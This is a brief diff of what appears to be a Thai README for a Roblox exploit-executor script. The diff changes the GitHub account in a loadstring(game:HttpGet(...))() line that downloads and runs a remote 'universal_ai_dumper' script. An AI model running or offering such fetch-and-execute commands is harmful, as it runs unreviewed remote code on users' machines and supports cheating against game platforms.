@@ -7,7 +7,7 @@
 คัดลอกคำสั่งด้านล่างนี้ไปวางในตัวรัน (Delta / Codex / Fluxus / Arceus X / Solara / Wave):
 
 ```lua
-loadstring(game:HttpGet("https://raw.githubusercontent.com/KaiX9/ry077777/main/universal_ai_dumper.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/grai10/ry077777/main/universal_ai_dumper.lua"))()
 ```
 
 ---
